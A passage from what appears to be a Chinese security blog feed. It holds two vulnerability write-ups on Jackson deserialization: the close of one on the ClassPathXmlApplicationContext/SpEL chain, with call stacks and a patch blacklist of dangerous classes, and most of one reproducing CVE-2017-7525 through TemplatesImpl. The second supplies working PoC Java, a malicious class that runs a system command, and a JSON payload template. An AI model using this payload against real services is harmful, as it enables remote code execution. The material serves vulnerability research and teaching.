alt=""></p><p>往下调试，发现会调用BeanDeserializerBase.deserializeFromString()函数来反序列化字符串内容，它会返回一个调用createFromString()函数从字符串中创建的实例对象：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/3.png" alt=""></p><p>跟进去看StdValueInstantiator.createFromString()函数，此时_fromStringCreator变量为AnnotatedConstructor类实例，参数value值为<code>http://127.0.0.1/spel.xml</code>，接着就是调用AnnotatedConstructor.call1()：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/4.png" alt=""></p><p>跟进去，调用了Constructor.newInstance()方法来创建新的实例：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/5.png" alt=""></p><p>往下调试，会调用到ClassPathXmlApplicationContext类的构造函数，看到configLocations参数值为spel.xml文件所在的URL地址，由于refresh参数值为True，因此会调用到refresh()函数：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/6.png" alt=""></p><p><strong>注意：前面调用newInstance()是新建我们的利用类org.springframework.context.support.ClassPathXmlApplicationContext的实例，但是我们看到并没有调用ClassPathXmlApplicationContext类相关的setter方法，这是因为该类本身就没有setter方法，但是拥有构造函数，因此Jackson反序列化的时候会自动调用ClassPathXmlApplicationContext类的构造函数。而这个点就是和之前的利用链的不同之处，该类的漏洞点出在自己的构造函数而非在setter方法中。</strong></p><p>下面我们继续调试看看ClassPathXmlApplicationContext类的构造函数中是哪里存在有漏洞。</p><p>跟进refresh()函数，进行一系列refresh之前的准备操作后，发现调用了invokeBeanFactoryPostProcessors()函数，顾名思义，就是调用上下文中注册为beans的工厂处理器：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/7.png" alt=""></p><p>继续跟下去，invokeBeanFactoryPostProcessors()函数中调用了getBeanNamesForType()函数来获取Bean名类型：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/8.png" alt=""></p><p>往下，进一步调用doGetBeanNamesForType()函数：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/9.png" alt=""></p><p>在doGetBeanNamesForType()函数中，调用isFactoryBean()判断当前beanName是否为FactoryBean，此时beanName参数值为”pb”，mbd参数中识别到bean标签中的类为java.lang.ProcessBuilder：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/10.png" alt=""></p><p>在isFactoryBean()函数中，调用predictBeanType()函数获取Bean类型：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/11.png" alt=""></p><p>跟进去，predictBeanType()函数中通过调用determineTargetType()函数来预测Bean类型：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/12.png" alt=""></p><p>determineTargetType()函数中通过调用()函数来确定目标类型：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/13.png" alt=""></p><p>跟下去，AbstractBeanFactory.resolveBeanClass()-&gt;AbstractBeanFactory.doResolveBeanClass()，用来解析Bean类，其中调用了evaluateBeanDefinitionString()函数来执行Bean定义的字符串内容，此时className参数指向”java.lang.ProcessBuilder”：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/14.png" alt=""></p><p>跟进AbstractBeanFactory.evaluateBeanDefinitionString()函数，其中调用了this.beanExpressionResolver.evaluate()，此时this.beanExpressionResolver指向的是StandardBeanExpressionResolver，也就是说已经调用到对应的SpEL表达式解析器了：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/15.png" alt=""></p><p>跟进StandardBeanExpressionResolver.evaluate()函数，发现调用了Expression.getValue()方法即SpEL表达式执行的方法，其中sec参数是我们可以控制的内容即由spel.xml解析得到的SpEL表达式：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/16.png" alt=""></p><p>后续就是SpEL表达式注入漏洞导致的任意代码执行了。</p><p>至此，整个调用过程就大致过了遍。简单地说，就是传入的需要被反序列化的org.springframework.context.support.ClassPathXmlApplicationContext类，它的构造函数存在SpEL注入漏洞，进而导致可被利用来触发Jackson反序列化漏洞。</p><p>调用到evaluate()函数时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">evaluate:163, StandardBeanExpressionResolver (org.springframework.context.expression)</span><br><span class="line">evaluateBeanDefinitionString:1452, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">doResolveBeanClass:1409, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">resolveBeanClass:1372, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">determineTargetType:670, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">predictBeanType:637, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">isFactoryBean:1489, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">doGetBeanNamesForType:421, DefaultListableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">getBeanNamesForType:391, DefaultListableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">invokeBeanFactoryPostProcessors:84, PostProcessorRegistrationDelegate (org.springframework.context.support)</span><br><span class="line">invokeBeanFactoryPostProcessors:693, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">refresh:531, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:144, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:85, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:18, PoC</span><br></pre></td></tr></table></figure><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>换成jackson-databind-2.7.9.2版本的jar试试，会报错，显示由于安全原因禁止了该非法类的反序列化操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: Illegal type (org.springframework.context.support.ClassPathXmlApplicationContext) to deserialize: prevented for security reasons</span><br></pre></td></tr></table></figure><p>在jackson-databind-2.7.9.2-sources.jar!\com\fasterxml\jackson\databind\jsontype\impl\SubTypeValidator.java中可以看到具体的黑名单信息，很遗憾的是没看到我们的利用类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:</span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599])</span></span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.ObjectFactory"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    <span class="comment">// [databind#1680]: may or may not be problem, take no chance</span></span><br><span class="line">    s.add(<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>);</span><br><span class="line">    <span class="comment">// [databind#1737]; JDK provided</span></span><br><span class="line">    s.add(<span class="string">"java.util.logging.FileHandler"</span>);</span><br><span class="line">    s.add(<span class="string">"java.rmi.server.UnicastRemoteObject"</span>);</span><br><span class="line">    <span class="comment">// [databind#1737]; 3rd party</span></span><br><span class="line">    <span class="comment">//s.add("org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor"); // deprecated by [databind#1855]</span></span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.config.PropertyPathFactoryBean"</span>);</span><br><span class="line">    s.add(<span class="string">"com.mchange.v2.c3p0.JndiRefForwardingDataSource"</span>);</span><br><span class="line">    s.add(<span class="string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span>);</span><br><span class="line">    <span class="comment">// [databind#1855]: more 3rd party</span></span><br><span class="line">    s.add(<span class="string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>);</span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么为啥能修补呢？我们调试看看。</p><p>在调用BeanDeserializerFactory.createBeanDeserializer()时，其中会调用_validateSubType()函数对子类型进行校验：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/17.png" alt=""></p><p>在SubTypeValidator._validateSubType()函数中看到，先进行黑名单过滤，发现类名不在黑名单后再判断是否是以”org.springframe”开头的类名，是的话循环遍历目标类的父类是否为”AbstractPointcutAdvisor”或”AbstractApplicationContext”，是的话跳出循环然后抛出异常：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/18.png" alt=""></p><p>而我们的利用类其继承关系是这样的：…-&gt;AbstractApplicationContext-&gt;AbstractRefreshableApplicationContext-&gt;AbstractRefreshableConfigApplicationContext-&gt;AbstractXmlApplicationContext-&gt;ClassPathXmlApplicationContext</p><p>可以看到，ClassPathXmlApplicationContext类是继承自AbstractApplicationContext类的，而该类会被过滤掉，从而没办法成功绕过利用。</p><hr><p>OK，下一篇继续其他CVE利用链的分析。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/16/Jackson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%94CVE-2017-7525%EF%BC%88%E5%9F%BA%E4%BA%8ETemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/</id>
    <published>2019-11-16T08:52:35.000Z</published>
    <updated>2019-11-17T11:41:35.214Z</updated>
    
    <content type="html"><![CDATA[<p>本次Jackson反序列化漏洞对于Jackson来说是首例，因此针对这些版本范围的漏洞利用类有很多，这章节只用TemplatesImpl这条在Fastjson也盛行的利用类进行演示，其他利用链在后面的文章中会补充分析。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.6系列 &lt; 2.6.7.1</p><p>Jackson 2.7系列 &lt; 2.7.9.1</p><p>Jackson 2.8系列 &lt; 2.8.8.1</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>JDK使用1.7版本的，不能使用1.8版本，具体原因后面章节会分析到。</p><p>注意，小版本搞的1.7版本的也会有些不能成功利用，具体要自己测试才知道哪些版本是可用的。</p><p>我本地用的JDK版本为1.7.0_21，之前用的1.7.0_80没成功。</p><h2 id="0x03-复现利用"><a href="#0x03-复现利用" class="headerlink" title="0x03 复现利用"></a>0x03 复现利用</h2><p>我本地用的jar包：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，commons-codec-1.12，commons-io-2.5，spring-core-4.3.13.RELEASE。</p><p>PoC.java，这里选择以开启DefaultTyping的方式进行反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        String exp = readClassStr(<span class="string">"./out/production/JSTest/com/evil/Exploit.class"</span>);</span><br><span class="line">        String jsonInput = aposToQuotes(<span class="string">"&#123;\"object\":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n"</span> +</span><br><span class="line">                <span class="string">"&#123;\n"</span> +</span><br><span class="line">                <span class="string">"'transletBytecodes':['"</span>+exp+<span class="string">"'],\n"</span> +</span><br><span class="line">                <span class="string">"'transletName':'mi1k7ea',\n"</span> +</span><br><span class="line">                <span class="string">"'outputProperties':&#123;&#125;\n"</span> +</span><br><span class="line">                <span class="string">"&#125;\n"</span> +</span><br><span class="line">                <span class="string">"]\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        Mi1k7ea mi1k7ea;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mi1k7ea = mapper.readValue(jsonInput, Mi1k7ea.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">aposToQuotes</span><span class="params">(String json)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">"'"</span>,<span class="string">"\""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClassStr</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileCopyUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)),byteArrayOutputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Mi1k7ea.java，要进行反序列化的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mi1k7ea</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit.java，恶意类，至于为何要继承AbstractTranslet类可以参考<a href="https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">《Fastjson系列二——1.2.22-1.2.24反序列化漏洞》</a>中的调试分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader br = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">//修改成你想要执行的命令</span></span><br><span class="line">            Process p = Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">            br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(line + <span class="string">"\n"</span>);</span><br><span class="line">                System.out.println(sb);</span><br><span class="line">            &#125;</span><br><span class="line">            File file = <span class="keyword">new</span> File(<span class="string">"result.txt"</span>);</span><br><span class="line">            <span class="comment">//File file =new File("javaio-appendfile.txt");</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//if file doesnt exists, then create it</span></span><br><span class="line">            <span class="keyword">if</span>(!file.exists())&#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//true = append file</span></span><br><span class="line">            FileWriter fileWritter = <span class="keyword">new</span> FileWriter(file.getName(),<span class="keyword">true</span>);</span><br><span class="line">            BufferedWriter bufferWritter = <span class="keyword">new</span> BufferedWriter(fileWritter);</span><br><span class="line">            bufferWritter.write(sb.toString());</span><br><span class="line">            bufferWritter.close();</span><br><span class="line">            System.out.println(sb);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可成功触发弹计算器：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/1.png" alt=""></p><p>Exploit类中换成其他命令的话运行结果保存在result.txt中：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/2.png" alt=""></p><p>这里我们看下PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"object"</span>:[</span><br><span class="line">        <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"transletBytecodes"</span>:[<span class="string">"xxx"</span>],</span><br><span class="line">            <span class="attr">"transletName"</span>:<span class="string">"mi1k7ea"</span>,</span><br><span class="line">            <span class="attr">"outputProperties"</span>:&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里解释下设置的几个JSON键值对：</p><ul><li>transletBytecodes——Base64编码的Exploit恶意类的字节流，编码原因可参考之前的<a href="https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">《Fastjson系列二——1.2.22-1.2.24反序列化漏洞》</a>；</li><li>transletName——TemplatesImpl类对象的_name属性值；</li><li>outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用；</li></ul><h2 id="0x04-调试分析"><a href="#0x04-调试分析" class="headerlink" title="0x04 调试分析"></a>0x04 调试分析</h2><p>在<code>mi1k7ea = mapper.readValue(jsonInput, Mi1k7ea.class);</code>中打下断点；同时，我们由之前Fastjson中的分析也知道，TemplatesImpl利用链的其中一步是调用了getOutputProperties()函数，我们也在这里打下断点。</p><p>下面开始调试，其中反序列化的处理过程和之前调试的一样，我们直接跟到关键的地方看看就好。</p><p>我们知道在BeanDeserializer.vanillaDeserialize()函数中会先新建Bean实例，然后调用deserializeAndSet()函数来解析属性值并设置到该Bean中；而在deserializeAndSet()函数中，会反射调用属性的setter方法来设置属性值。</p><p>前两个属性transletBytecodes和transletName都是通过反射机制调用setter方法设置的，<strong>但是outputProperties属性在deserializeAndSet()函数中是通过反射机制调用它的getter方法，这就是该利用链能被成功触发的原因，虽然Jackson的反序列化机制只是调用setter方法，但是是调用SetterlessProperty.deserializeAndSet()来解析outputProperties属性而前面两个属性是调用的MethodProperty.deserializeAndSet()解析的，其中SetterlessProperty.deserializeAndSet()函数中是调用属性的getter方法而非setter方法</strong>：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/4.png" alt=""></p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/3.png" alt=""></p><p>再往下就是反射调用到了getOutputProperties()：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/5.png" alt=""></p><p>再后面就和Fastjson中分析的一样了，这里不再赘述。</p><p>利用链：getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()-&gt;恶意类构造函数</p><p>到getOutputProperties()时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:431, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">deserializeAndSet:105, SetterlessProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:493, SettableBeanProperty (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserializeAndSet:101, FieldProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:27, PoC</span><br></pre></td></tr></table></figure><h2 id="0x05-为什么要设置transletName属性值"><a href="#0x05-为什么要设置transletName属性值" class="headerlink" title="0x05 为什么要设置transletName属性值"></a>0x05 为什么要设置transletName属性值</h2><p>PoC不写该属性值的话会报错，我们调试分析下原因。</p><p>跟踪到getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()这条调用链时发现，问题出在TemplatesImpl.getTransletInstance()函数中：</p><p><img src="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/6.png" 